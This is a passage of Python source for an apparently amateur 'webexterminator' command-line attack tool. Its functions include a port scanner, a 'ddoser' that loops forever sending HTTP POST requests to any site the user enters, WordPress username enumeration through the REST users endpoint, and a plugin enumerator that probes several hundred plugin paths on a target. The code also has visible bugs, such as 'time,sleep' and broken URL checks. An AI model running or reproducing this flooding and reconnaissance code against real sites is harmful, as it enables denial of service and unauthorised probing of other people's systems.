     for nserver in name_servers:
        number+=1
        print(Fore.LIGHTYELLOW_EX+"name server"+str(number)+" :"+nserver)  

    number = 0

    if expiration_date == None:
        pass
    else:
        print(Fore.LIGHTYELLOW_EX+"expiration date :"+str(expiration_date[0]))
    if admin_name == None:
        pass
    else:
      print(Fore.LIGHTBLUE_EX+" admin name "+str(admin_name))
    if admin_address == None:
        pass
    else:
     print(Fore.LIGHTBLUE_EX+"admin address "+str(admin_address))
    if admin_country == None:
     pass
    else: 
     print(Fore.LIGHTBLUE_EX+"admin contry "+str(admin_country))
    if addmin_city == None:
     pass
    else: 
     print(Fore.LIGHTBLUE_EX+"admin city "+str(addmin_city))
    if admin_state == None:
        pass
    else:
     print(Fore.LIGHTBLUE_EX+"admin state"+str(admin_state))
    if admin_organization == None:
        pass
    else:
     print(Fore.LIGHTBLUE_EX+"admin organization "+str(admin_organization))
    try:
     if emails == None:
         pass
     else:
        print("emails : "+emails)
    except:
      pass   
    print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
    print("[1] back")
    print("[2] run again")
    Fore.RED
    enter = input("enter  > > >")
    if enter == "2":
     adminsiteinfo()
    else:
      home()

 except:
  time.sleep(10) 
  home()



#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


def wordpress():
  
  banner()
  time.sleep(0.3)
  print(Fore.GREEN+"[!] pleas enteryour select \n")
  time.sleep(0.3)
  print(Fore.LIGHTBLUE_EX+"*************************")
  time.sleep(0.3)
  print(Fore.LIGHTYELLOW_EX+"[1] users website")
  time.sleep(0.3)
  print(Fore.LIGHTBLUE_EX+"*************************")
  time.sleep(0.3)
  print(Fore.LIGHTYELLOW_EX+"[2] Plugins website")
  time.sleep(0.3)
  print(Fore.LIGHTBLUE_EX+"*************************")
  time,sleep(0.3)
  print(Fore.LIGHTYELLOW_EX+"[3] back to menu")
   
  print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#wordpress"+Fore.GREEN+"]"+Fore.RED)
  Fore.RED
  user_select_wordpress = input("|_______.::[")

  if user_select_wordpress == "3":
    home()
  elif user_select_wordpress == "1":
    userswordpress()
  elif user_select_wordpress == "2":
     plugininstallinwordoress()  

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def portscann():

 from socket import gethostbyname,AF_INET, SOCK_STREAM
 init()
 banner()
 time.sleep(3)
 print(Fore.LIGHTGREEN_EX+"[!] Pleas enter site address  ")
 print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#Information Gathering"+Fore.LIGHTYELLOW_EX+"/Port scanner"+Fore.GREEN+"]"+Fore.RED)
 url = input("|_______.::[ ")

 ip = gethostbyname(url)
 print(Fore.LIGHTWHITE_EX+"\n port scanning ... ")
 print(Fore.LIGHTWHITE_EX+"pleas wite")
 for i in range(1, 100):

   s = socket(AF_INET, SOCK_STREAM)

   result = s.connect_ex((ip, i))

   if(result == 0):

        print (Fore.LIGHTCYAN_EX+'Port %d: OPEN' % (i,))

        s.close()
   print("")
   print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
   print("[1] back")
   print("[2] run again")
   Fore.RED
   enter = input("enter  > > >")    
   if enter == "2":
      portscann()
   else:
      home()       


#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@



def ddoser():
   
  import time
  import socket
  import sys
  import requests
  from colorama import Fore,init
  try:
    banner()
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX+"[!] pleas enter address website")
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#DDOSER"+Fore.GREEN+"]"+Fore.RED) 
    site =  input("|________.::[")
    if not "https://" in site or not "http://":
      site = "https://"+site
    else:
      pass  
    while 1<2:
      r = requests.post(site+"/"+"webexterminator")
      print(Fore.LIGHTYELLOW_EX+"Packet Sent")
  except:
    home()                          

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def Reverse_IP():
  
    banner()
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX+"[!] pleas enter address site")
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#Information Gathering"+Fore.LIGHTYELLOW_EX+"/Reverse_IP"+Fore.GREEN+"]"+Fore.RED)
    address = input("|_______.::[ ")
    req = requests.post("https://domains.yougetsignal.com/domains.php",data={"remoteAddress": address})
    code = json.loads(req.content)

    for data in code["domainArray"]:
                    
                    print(Fore.LIGHTWHITE_EX+" "+data[0]+"\n")

    Fore.RESET
    print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
    print("[1] back")
    print("[2] run again")
    Fore.RED
    enter = input("enter  > > >")
    if enter == "2":
     Reverse_IP()
    else:
      home()       

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def viewpagesource():
  try:
    banner()

    time.sleep(2)
    init()
    print(Fore.LIGHTGREEN_EX+"[!] pleas enter url")
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#DDOSER"+Fore.GREEN+"]"+Fore.RED) 
    site =  input("|________.::[")
    if not "https://" in site or not "http://" in site:
        site = "https://"+site
    code = requests.post(site).text
    code = str(code)

    print(Fore.WHITE+code.replace("}","\n}").replace(">",">\n").replace(")",")\n"))
    
    print("")
        
    print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
    print("[1] back")
    print("[2] run again")
    Fore.RED
    enter = input("enter  > > >")
    if enter == "2":
          viewpagesource()
    else:
          home()         
  except:
    home()    
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def userswordpress():
    banner()
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX+"[!] pleas enter address site")
    print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#wordpress"+Fore.LIGHTYELLOW_EX+"/users website"+Fore.GREEN+"]"+Fore.RED)
    add = input("|_______.::[")
    Fore.LIGHTBLUE_EX
    if not "https://" in add or not "http://" in add:
     add = "https://"+ add
    try:
     cms = builtwith.parse(add)
     cms = cms['cms']
     cms = str(cms)
     if not "WordPress" in cms :
        print(Fore.RED+"[!] ERROR ! ! ! site is not wordpress")
        time.sleep(2)
        
        print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
        print("[1] back")
        print("[2] run again")
        Fore.RED
        enter = input("enter  > > >")
        if enter == "2":
                  userswordpress()
        else:
                  home()
    except:
            print(Fore.RED+"[!] ERROR ! ! ! site is not wordpress")
            time.sleep(2)
            print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
            print("[1] back")
            print("[2] run again")
            Fore.RED
            enter = input("enter  > > >")
            if enter == "2":
                  userswordpress()
            else:
                  home()
    else:
     pass
    r = requests.get(add+'/wp-json/wp/v2/users/').text
    j = json.loads(r)
    for a in j:
     print(Fore.LIGHTMAGENTA_EX+a['slug'])
    
    print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
    print("[1] back")
    print("[2] run again")
    Fore.RED
    enter = input("enter  > > >")
    if enter == "2":
       userswordpress()
    else:
       home()
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def plugininstallinwordoress():
  pl = ("""wordpress-importer
  regenerate-thumbnails
  wp-super-cache
  jetpack
  wordfence
  wordpress-seo
  tinymce-advanced
  akismet
  google-sitemap-generator
  google-analytics-for-wordpress
  contact-form-7
  duplicate-post
  wp-pagenavi
  advanced-custom-fields
  hello-dolly
  nextgen-gallery
  woocommerce
  all-in-one-seo-pack
  w3-total-cache
  really-simple-captcha
  siteorigin-panels
  disable-comments
  wp-multibyte-patch
  google-analytics-dashboard-for-wp
  black-studio-tinymce-widget
  updraftplus
  better-wp-security
  wpclef
  duplicator
  ml-slider
  googleanalytics
  so-widgets-bundle
  shortcodes-ultimate
  redirection
  ninja-forms
  mailchimp-for-wp
  breadcrumb-navxt
  wp-mail-smtp
  wp-optimize
  wp-db-backup
  backwpup
  image-widget
  broken-link-checker
  si-contact-form
  wp-smushit
  tablepress
  contact-form-7-to-database-extension
  the-events-calendar
  google-analyticator
  wp-maintenance-mode
  iwp-client
  all-in-one-wp-security-and-firewall
  post-types-order
  wptouch
  formidable
  user-role-editor
  captcha
  wysija-newsletters
  ewww-image-optimizer
  force-regenerate-thumbnails
  bbpress
  custom-post-type-ui
  add-to-any
  page-links-to
  yet-another-related-posts-plugin
  wp-google-maps
  widget-logic
  yith-woocommerce-wishlist
  si-captcha-for-wordpress
  simple-page-ordering
  contact-form-plugin
  simple-custom-css
  easy-google-fonts
  types
  disqus-comment-system
  wp-statistics
  photo-gallery
  quick-pagepost-redirect-plugin
  easy-fancybox
  maintenance
  seo-ultimate
  cookie-law-info
  sucuri-scanner
  backupwordpress
  redux-framework
  antispam-bee
  wp-clone-by-wp-academy
  seo-image
  instagram-feed
  responsive-lightbox
  ps-auto-sitemap
  display-widgets
  wordpress-popular-posts
  worker
  woosidebars
  newsletter
  wp-postviews
  login-lockdown
  wp-user-avatar
  coming-soon
  bwp-google-xml-sitemaps
  recent-tweets-widget
  addthis
  social-media-widget
  custom-sidebars
  velvet-blues-update-urls
  admin-menu-editor
  buddypress
  simple-social-icons
  loco-translate
  pretty-link
  enable-media-replace
  custom-facebook-feed
  genesis-simple-edits
  sidekick
  php-code-widget
  simple-301-redirects
  taxonomy-terms-order
  wp-retina-2x
  mainwp-child
  social-networks-auto-poster-facebook-twitter-g
  simple-share-buttons-adder
  all-in-one-wp-migration
  underconstruction
  adminimize
  widget-importer-exporter
  google-publisher
  cookie-notice
  polylang
  wp-google-fonts
  wp-dbmanager
  wp-polls
  simple-tags
  official-statcounter-plugin-for-wordpress
  social-media-feather
  mailchimp
  meta-box
  wp-spamshield
  wp-migrate-db
  wp-fastest-cache
  anti-spam
  ultimate-coming-soon-page
  simple-lightbox
  gotmls
  autoptimize
  shareaholic
  wp-edit
  loginizer
  share-this
  youtube-embed-plus
  slideshow-jquery-image-gallery
  mappress-google-maps-for-wordpress
  ultimate-tinymce
  wp-slimstat
  insert-headers-and-footers
  intuitive-custom-post-order
  search-and-replace
  wordpress-23-related-posts-plugin
  wp-lightbox-2
  imsanity
  options-framework
  recent-posts-widget-extended
  auto-post-thumbnail
  contact-form-7-honeypot
  members
  title-remover
  theme-my-login
  p3-profiler
  easy-theme-and-plugin-upgrades
  add-meta-tags
  sumome
  slider-image
  comprehensive-google-map-plugin
  spacer
  sg-cachepress
  mce-table-buttons
  amoforms
  wp-social-bookmarking-light
  all-in-one-event-calendar
  iframe
  wordpress-ping-optimizer
  wp-sitemap-page
  google-sitemap-plugin
  wp-security-scan
  facebook-like-box-widget
  pubsubhubbub
  rename-wp-login
  events-manager
  video-thumbnails
  wp-instagram-widget
  bulletproof-security
  antivirus
  facebook-comments-plugin
  insert-php
  pirate-forms
  wp-editor
  column-shortcodes
  visual-form-builder
  white-label-cms
  yith-woocommerce-ajax-search
  easy-wp-smtp
  better-search-replace
  theme-check
  fancybox-for-wordpress
  virtue-toolkit
  xml-sitemap-feed
  wordpress-backup-to-dropbox
  cloudflare
  password-protected
  yith-woocommerce-compare
  list-category-posts
  cornerstone
  advanced-code-editor
  wp-jquery-lightbox
  seo-automatic-links
  revision-control
  addquicktag
  qtranslate-x
  use-any-font
  google-maps-widget
  relevanssi
  wp-postratings
  cyr3lat
  favicon-by-realfavicongenerator
  simple-custom-post-order
  custom-field-template
  subscribe2
  easy-table
  google-language-translator
  use-google-libraries
  wp-jalali
  google-document-embedder
  easy-facebook-likebox
  genesis-simple-hooks
  simple-social-buttons
  blogger-importer
  disable-google-fonts
  contact-form-7-datepicker
  responsive-add-ons
  ckeditor-for-wordpress
  post-duplicator
  yith-woocommerce-zoom-magnifier
  advanced-excerpt
  soliloquy-lite
  easing-slider
  genesis-enews-extended
  custom-login
  ps-disable-auto-formatting
  cms-tree-page-view
  search-everything
  flamingo
  gallery-plugin
  smart-youtube
  meteor-slides
  count-per-day
  wp-tab-widget
  contact-form-builder
  reveal-ids-for-wp-admin-25
  dynamic-widgets
  wp-review
  automatic-updater
  simple-image-widget
  download-manager
  master-slider
  wp-recaptcha
  wp-to-twitter
  spam-free-wordpress
  category-posts
  tweet-old-post
  bwp-minify
  pushpress
  child-theme-configurator
  oauth-twitter-feed-for-developers
  responsive-menu
  genesis-responsive-slider
  cyclone-slider-2
  lightbox-gallery
  siteguard
  postman-smtp
  add-from-server
  peters-login-redirect
  secure-wordpress
  q2w3-fixed-widget
  wp-shortcode
  auto-terms-of-service-and-privacy-policy
  option-tree
  yith-woocommerce-ajax-navigation
  megamenu
  ultimate-social-media-icons
  custom-permalinks
  beaver-builder-lite-version
  get-the-image
  all-404-redirect-to-homepage
  table-of-contents-plus
  wp-paginate
  timthumb-vulnerability-scanner
  one-click-child-theme
  sitemap
  xcloner-backup-and-restore
  nav-menu-roles
  uk-cookie-consent
  form-maker
  hide-title
  contextual-related-posts
  csv-importer
  stops-core-theme-and-plugin-updates
  google-calendar-events
  jquery-colorbox
  header-footer
  display-posts-shortcode
  404-to-start
  login-customizer
  widgets-on-pages
  download-monitor
  custom-contact-forms
  feedwordpress
  zopim-live-chat
  gallery-images
  enhanced-media-library
  subscribe-to-comments
  facebook-pagelike-widget
  wp-video-lightbox
  newstatpress
  simple-image-sizes
  better-delete-revision
  wp-job-manager
  wp-google-map-plugin
  wp-members
  maxbuttons
  search-regex
  widget-css-classes
  foobox-image-lightbox
  nextend-facebook-connect
  menu-icons
  wpremote
  amr-shortcode-any-widget
  widget-settings-importexport
  easy-twitter-feed-widget
  wp-piwik
  enhanced-text-widget
  bad-behavior
  really-simple-csv-importer
  block-bad-queries
  testimonials-widget
  wp-smtp
  printfriendly
  email-address-encoder
  exploit-scanner
  portfolio-post-type
  widget-context
  sidebar-login
  smk-sidebar-generator
  accesspress-social-icons
  custom-post-type-permalinks
  taxonomy-metadata
  multiple-post-thumbnails
  codepress-admin-columns
  lazy-load
  baidu-sitemap-generator
  sexybookmarks
  404-to-301
  floating-social-media-icon
  categories-images
  lockdown-wp-admin
  wpcat2tag-importer
  asesor-cookies-para-la-ley-en-espana
  wordpress-popup
  404-redirection
  twitter-widget-pro
  disable-xml-rpc-pingback
  tiny-compress-images
  rvg-optimize-database
  movabletype-importer
  jquery-collapse-o-matic
  head-cleaner
  wp-clean-up
  testimonials-by-woothemes
  wassup
  advanced-access-manager
  user-switching
  clean-and-simple-contact-form-by-meg-nicholas
  adrotate
  verify-google-webmaster-tools
  no-category-base-wpml
  email-subscribers
  login-with-ajax
  editorial-calendar
  amp
  google-analytics-dashboard
  wp-e-commerce
  eu-cookie-law
  advanced-responsive-video-embedder
  growmap-anti-spambot-plugin
  cryout-theme-settings
  post-expirator
  nk-google-analytics
  wp-construction-mode
  instagram-slider-widget
  easy-digital-downloads
  hyper-cache
  bulk-delete
  envira-gallery-lite
  easy-bootstrap-shortcodes
  twitter
  wp-database-backup
  jquery-updater
  edit-author-slug
  youtube-channel-gallery
  wp-responsive-menu
  powerpress
  wpfront-user-role-editor
  wp-copyprotect
  wp-hide-post
  syntaxhighlighter
  simple-page-sidebars
  leaflet-maps-marker
  contact-form-7-dynamic-text-extension
  google-captcha
  remove-query-strings-from-static-resources
  clone-posts
  wp-product-review
  crayon-syntax-highlighter
  genesis-simple-sidebars
  wp-all-import
  paid-memberships-pro
  wordpress-simple-paypal-shopping-cart
  page-list
  disable-xml-rpc
  wp-spamfree
  dynamic-featured-image
  uber-login-logo
  woocommerce-pdf-invoices-packing-slips
  popup-maker
  wp-author-date-and-meta-remover
  wp125
  recent-posts-widget-with-thumbnails
  portfolio-gallery
  facebook-button-plugin
  wp-customer-reviews
  simple-sitemap
  accesspress-social-share
  rss-importer
  duracelltomi-google-tag-manager
  wp-photo-album-plus
  wp-subscribe
  hupso-share-buttons-for-twitter-facebook-google
  social-media-builder
  post-thumbnail-editor
  adminer
  contact-form-to-email
  feedburner-plugin
  foogallery
  contact-form-maker
  wordpress-social-login
  easy-adsense-lite
  raw-html
  zencache
  wps-hide-login
  mailchimp-forms-by-mailmunch
  slideshow-gallery
  post-type-archive-links
  related-posts
  wp-gallery-custom-links
  user-photo
  like-box
  no-comments
  coming-soon-maintenance-mode-from-acurax
  tubepress
  pdf-embedder
  easy-social-icons
  woocommerce-multilingual
  eps-301-redirects
  cleantalk-spam-protect
  wp-google-analytics
  user-access-manager
  accesspress-social-counter
  font
  really-simple-facebook-twitter-share-buttons
  backup
  facebook-conversion-pixel
  dynamic-to-top
  wp-total-hacks
  profile-builder
  scroll-back-to-top
  yikes-inc-easy-mailchimp-extender
  wp-add-custom-css
  paypal-donations
  resize-image-after-upload
  ad-injection
  flash-album-gallery
  post-type-switcher
  favicon-rotator
  feed-them-social
  slider-wd
  wp-pagenavi-style
  visitor-maps
  flickr-rss
  wysiwyg-widgets
  wp-print
  multi-plugin-installer
  bruteprotect
  coming-soon-page
  so-css
  woocommerce-delivery-notes
  wp-mail-bank
  search-meter
  wp-filebase
  lightbox
  widget-shortcode
  html-sitemap
  all-in-one-schemaorg-rich-snippets
  s2member
  compact-wp-audio-player
  bj-lazy-load
  wp-content-copy-protector
  alpine-photo-tile-for-instagram
  pods
  site-is-offline-plugin
  capability-manager-enhanced
  multi-device-switcher
  remove-category-url
  call-now-button
  gzip-ninja-speed-compression
  gtranslate
  menu-image
  wordpress-database-reset
  bootstrap-3-shortcodes
  wp-rss-aggregator
  ssh-sftp-updater-support
  my-calendar
  wonderm00ns-simple-facebook-open-graph-tags
  event-organiser
  youtube-embed
  wp-simple-firewall
  woocommerce-customizer
  wpmandrill
  easy-testimonials
  gallery-video
  woocommerce-grid-list-toggle
  calendar
  formget-contact-form
  content-views-query-and-display-post-page
  baw-login-logout-menu
  wufoo-shortcode
  any-mobile-theme-switcher
  wp-content-copy-protection
  oa-social-login
  twitter-facebook-google-plusone-share
  php-text-widget
  spider-event-calendar
  top-10
  wp-crontrol
  json-api
  features-by-woothemes
  dropdown-menu-widget
  simple-map
  theme-junkie-custom-css
  pixtypes
  social-sharing-toolkit
  pinterest-pin-it-button
  advanced-wp-columns
  mashsharer
  weaver-ii-theme-extras
  cmb2
  wp-updates-notifier
  ultimate-posts-widget
  wp-security-audit-log
  advanced-iframe
  no-page-comment
  newsletter-sign-up
  ag-custom-admin
  varnish-http-purge
  wp-useronline
  easy-smooth-scroll-links
  theme-test-drive
  video-embed-thumbnail-generator
  gallery-bank
  stop-spammer-registrations-plugin
  awesome-weather
  simple-history
  baw-post-views-count
  wpide
  posts-in-page
  styles
  custom-post-widget
  crazy-bone
  php-code-for-posts
  audit-trail
  magee-shortcodes
  related-posts-thumbnails
  flexi-pages-widget
  font-awesome-4-menus
  acurax-social-media-widget
  smart-slider-3
  tabby-responsive-tabs
  woocommerce-checkout-manager
  delete-all-comments
  page-scroll-to-id
  woocommerce-menu-bar-cart
  contact-widgets
  templatesnext-toolkit
  debug-bar
  genesis-title-toggle
  ditty-news-ticker
  ozh-admin-drop-down-menu
  wowslider
  mw-wp-form
  rotatingtweets
  better-analytics
  woocommerce-colors
  ultimate-member
  advanced-image-styles
  ultimate-maintenance-mode
  aqua-page-builder
  fourteen-colors
  bwp-recaptcha
  booking
  video-sidebar-widgets
  dropbox-backup
  wp-admin-ui-customize
  disable-emojis
  custom-field-suite
  rocket-maintenance-mode
  admin-menu-tree-page-view
  lightweight-social-icons
  nginx-helper
  wc-shortcodes
  content-aware-sidebars
  all-in-one-webmaster
  insert-html-snippet
  kk-star-ratings
  add-link-to-facebook
  contact-bank
  accesspress-twitter-feed
  really-simple-ssl
  only-tweet-like-share-and-google-1
  rss-includes-pages
  ultimate-social-media-plus
  woocommerce-google-analytics-integration
  pixcodes
  wunderground
  ultimate-form-builder-lite
  facebook-auto-publish
  ultimate-responsive-image-slider
  social-count-plus
  statify
  new-google-plus-badge-widget
  remove-google-fonts-references
  easy-pie-maintenance-mode
  wp-flexible-map
  my-custom-css
  commentluv
  codepeople-post-map
  responsive-select-menu
  mp3-jplayer
  safe-redirect-manager
  ad-inserter
  svg-vector-icon-plugin
  advanced-random-posts-widget
  flexible-posts-widget
  transposh-translation-filter-for-wordpress
  google-maps
  wp-insert
  italy-cookie-choices
  subscribe-to-comments-reloaded
  popups
  nextcellent-gallery-nextgen-legacy
  ultimate-category-excluder
  dirtysuds-embed-pdf
  heartbeat-control
  easy-pricing-tables
  bm-custom-login
  woocommerce-all-in-one-seo-pack
  easy-watermark
  speed-booster-pack
  aryo-activity-log
  pc-robotstxt
  clicky
  kiwi-logo-carousel
  gallery-by-supsystic
  disable-feeds
  related-posts-by-zemanta
  tiled-gallery-carousel-without-jetpack
  erident-custom-login-and-dashboard
  one-click-close-comments
  under-construction-wp
  better-font-awesome
  easy-pie-coming-soon
  nofollow
  login-security-solution
  add-logo-to-admin
  attachments
  sendgrid-email-delivery-simplified
  sem-external-links
  fonts
  ga-google-analytics
  carousel-without-jetpack
  media-library-assistant
  kimili-flash-embed
  smooth-slider
  custom-meta-widget
  rss-footer
  facebook-members
  acf-field-date-time-picker
  floating-social-bar
  vaultpress
  iq-block-country
  ssl-insecure-content-fixer
  fruitful-shortcodes
  genesis-favicon-uploader
  jquery-pin-it-button-for-images
  amazon-web-services
  woocommerce-csvimport
  show-hide-author
  facebook-page-promoter-lightbox
  customizer-export-import
  extended-categories-widget
  unyson
  simple-follow-me-social-buttons-widget
  simply-exclude
  svg-support
  tracking-code-manager
  menu-social-icons
  homepage-control
  wp-sendgrid
  wp-noexternallinks
  wp-sticky
  recent-facebook-posts
  wp-super-cache-clear-cache-menu
  saphali-woocommerce-lite
  wordpress-mobile-pack
  wp-twitter-feeds
  manual-image-crop
  youtube-widget-responsive
  yuzo-related-post
  image-watermark
  wp-better-emails
  simple-google-map
  easy-coming-soon
  easy-social-share-buttons
  intergeo-maps
  duplicate-page-and-post
  wp-external-links
  testimonial-rotator
  simply-instagram
  jquery-t-countdown-widget
  wpgform
  landing-pages
  wp-share-buttons-analytics-by-getsocial
  woocommerce-exporter
  footer-putter
  favicon-xt-manager
  itro-popup
  buddypress-media
  comet-cache
  wordpress-access-control
  remove-dashboard-access-for-non-admins
  gantry
  super-socializer
  bulk-page-creator
  gwolle-gb
  drafts-scheduler
  open-external-links-in-a-new-window
  meta-manager
  facebook-by-weblizar
  hide-admin-bar-from-non-admins
  fv-top-level-cats
  smart-slider-2
  kebo-twitter-feed
  yop-poll
  persian-woocommerce
  schema-creator
  optinmonster
  code-snippets
  embedplus-for-wordpress
  calculated-fields-form
  contact-form-7-mailchimp-extension
  quotes-collection
  wp-performance-score-booster
  wp-fail2ban
  google
  tawkto-live-chat
  stealth-login-page
  metronet-reorder-posts
  admin-management-xtended
  newpost-catch
  showcase-visual-composer-addon
  jquery-smooth-scroll
  post-snippets
  child-themify
  global-content-blocks
  bootstrap-for-contact-form-7
  custom-menu-wizard
  wpfront-scroll-top
  caldera-forms
  simple-full-screen-background-image
  fv-wordpress-flowplayer
  wp-pro-quiz
  link-library
  custom-favicon
  wp-facebook-open-graph-protocol
  wp-site-migrate
  featured-video-plus
  mail-subscribe-list
  woocommerce-product-archive-customiser
  ad-widget
  woocommerce-pagseguro
  orbisius-child-theme-creator
  wordpress-reset
  custom-share-buttons-with-floating-sidebar
  woocommerce-jetpack
  email-encoder-bundle
  addon-so-widgets-bundle
  logo-slider
  google-universal-analytics
  rest-api
  wp-ban
  strictly-autotags
  contact-form-email
  simple-twitter-tweets
  ifeature-slider
  restricted-site-access
  image-slider-widget
  user-submitted-posts
  easy-modal
  rus-to-lat-advanced
  wp-live-chat-support
  stats-counter
  backup-with-restore
  projects-by-woothemes
  wp-htaccess-control
  lj-maintenance-mode
  advanced-post-slider
  gregs-high-performance-seo
  wp-sweep
  qtranslate-slug
  google-maps-easy
  grand-media
  widgetize-pages-light
  visitors-traffic-real-time-statistics
  what-the-file
  taxonomy-images
  cpt-bootstrap-carousel
  amazon-s3-and-cloudfront
  polldaddy
  wp-seo-qtranslate-x
  cachify
  robo-gallery
  shortpixel-image-optimiser
  posts-to-posts
  rich-text-tags
  co-authors-plus
  easy-video-player
  soundcloud-is-gold
  go-live-update-urls
  squirrly-seo
  ecwid-shopping-cart
  shortcoder
  wp-math-captcha
  genesis-translations
  hide-my-site
  paypal-for-woocommerce
  advanced-sidebar-menu
  yith-maintenance-mode
  duplicate-menu
  wp-email-login
  simple-facebook-plugin
  admin-custom-login
  cimy-user-extra-fields
  contact-form-manager
  wordpress-easy-paypal-payment-or-donation-accept-plugin
  wp-backitup
  yith-woocommerce-quick-view
  brute-force-login-protection
  super-simple-google-analytics
  wp-limit-login-attempts
  header-and-footer-scripts
  wordpress-language
  i-recommend-this
  wc-gallery
  business-directory-plugin
  js-composer-qtranslate-x
  customify
  advanced-ads
  woocommerce-sequential-order-numbers
  zero-spam
  website-monetization-by-magenet
  sydney-toolbox
  groups
  pagerestrict
  bootstrap-shortcodes
  css-javascript-toolbox
  easy-image-gallery
  analytics-counter
  admin-post-navigation
  horizontal-scrolling-announcement
  woocommerce-shortcodes
  mailgun
  wordpress-social-ring
  embed-any-document
  magic-fields-2
  wangguard
  disable-wordpress-updates
  vanilla-pdf-embed
  postie
  email-before-download
  juiz-social-post-sharer
  simple-maintenance-mode
  yandex-metrika
  breadcrumb-trail
  wp-job-manager-contact-listing
  social-share-buttons-by-supsystic
  wp-maintenance
  trust-form
  sqlite-integration
  social-media-icons-widget
  captcha-on-login
  post-views-counter
  typekit-fonts-for-wordpress
  alo-easymail
  udinra-all-image-sitemap
  youtube-channel
  gigpress
  rating-widget
  wp-media-library-categories
  wp-nested-pages
  simple-ads-manager
  genesis-simple-share
  gravity-forms-custom-post-types
  faster-pagination
  advanced-text-widget
  wplegalpages
  player
  json-rest-api
  google-authenticator
  genesis-connect-woocommerce
  pinterest-pin-it-button-on-image-hover-and-post
  cms-commander-client
  contact-form-7-add-confirm
  store-locator-le
  ajax-load-more
  facebook-thumb-fixer
  instagram-for-wordpress
  easy-media-gallery
  wordpress-move
  click-to-tweet-by-todaymade
  improved-include-page
  woocommerce-xml-csv-product-import
  wp-hide-dashboard
  https-redirection
  formbuilder
  tumblr-importer
  wordpress-post-tabs
  wp-job-manager-locations
  welcome-email-editor
  columns
  wp-mobile-detect
  acf-qtranslate
  rss-post-importer
  crazyegg-heatmap-tracking
  our-team-enhanced
  social-locker
  accordion-shortcodes
  seamless-donations
  media-file-renamer
  thesis-openhook
  email-newsletter
  wp-stats
  flickr-badges-widget
  uji-countdown
  check-email
  wp-editor-widget
  alexa-internet
  basic-google-maps-placemarks
  wp-social-likes
  synved-shortcodes
  xml-sitemaps
  nav-menu-images
  email-users
  mobble
  woocommerce-correios
  starbox
  wp-recaptcha-integration
  google-maps-builder
  wp-page-widget
  wp-social-sharing
  ricg-responsive-images
  new-user-approve
  rss-import
  nospamnx
  public-post-preview
  shortcode-widget
  popup-by-supsystic
  webriti-smtp-mail
  magic-action-box
  multiple-content-blocks
  genesis-layout-extras
  animate-it
  simple-wp-sitemap
  aweber-web-form-widget
  """).split("\n")
  banner()
  time.sleep(2)
  print(Fore.LIGHTGREEN_EX+"[!] pleas enter address site")
  print(Fore.RED+" _____"+Fore.GREEN+"["+Fore.WHITE+"webexterminator"+Fore.LIGHTBLUE_EX+"$HOME"+Fore.LIGHTCYAN_EX+"#wordpress"+Fore.LIGHTYELLOW_EX+"/users website"+Fore.GREEN+"]"+Fore.RED)
  add = input("|_______.::[")
  Fore.LIGHTBLUE_EX
  if not "https://" in add or not "http://" in add:
     add = "https://"+ add
  try:
     cms = builtwith.parse(add)
     cms = cms['cms']
     cms = str(cms)
     if not "WordPress" in cms :
        print(Fore.RED+"[!] ERROR ! ! ! site is not wordpress")
        time.sleep(2)
        
        print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
        print("[1] back")
        print("[2] run again")
        Fore.RED
        enter = input("enter  > > >")
        if enter == "2":
                  userswordpress()
        else:
                  home()
     else:
       pass
     for plus in pl:
      r = requests.get(add+'/wp-content/plugins/'+plus)
      if r.status_code == 200:
        print(Fore.GREEN+" [+] "+Fore.BLUE+add+'/wp-content/plugins/'+plus+Fore.WHITE+" > "+Fore.GREEN+" Found")
      
      else:
          print(Fore.RED+" [-]"+Fore.BLUE+add+'/wp-content/plugins/'+plus+Fore.WHITE+" > "+Fore.RED+" Not Found")
                        
  except:
            print(Fore.RED+"[!] ERROR ! ! ! site is not wordpress")
            time.sleep(2)
            print(Fore.LIGHTBLUE_EX+"[$@$] pleas enter your select")
            print("[1] back")
            print("[2] run again")
            Fore.RED
            enter = input("enter  > > >")
            if enter == "2":
                  userswordpress()
            else:
                  home()
 
